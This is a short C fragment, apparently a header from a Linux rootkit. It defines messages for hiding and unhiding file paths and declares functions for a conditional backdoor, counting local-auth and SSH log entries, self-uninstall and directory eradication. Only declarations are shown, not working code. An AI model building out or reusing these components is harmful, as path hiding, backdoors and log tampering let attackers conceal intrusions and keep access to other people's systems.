#define ERR_ACSS_PATH     "access failed on path. does it exist?"
#define ALRDY_HIDDEN_STR  "path is already hidden..."
#define PATH_HIDDEN_STR   "path now hidden"
#define ERR_HIDING_PATH   "error hiding path"
#define ALRDY_VISIBLE_STR "path is already visible..."
#define PATH_VISIBLE_STR  "path now visible"
#define ERR_UNHIDING_PATH "error unhiding path"

#ifdef BACKDOOR_ROLF
#if defined LOG_LOCAL_AUTH || defined LOG_SSH
int logcount(const char *path);
#endif
void dorolfpls(void);
#include "rolf.c"
#endif

void option_err(char *a0);
void eradicatedir(const char *target);
void uninstallbdv(void);
void do_self(void);
void symlinkstuff(void);
void dobdvutil(char *const argv[]);
#include "magicutils.c"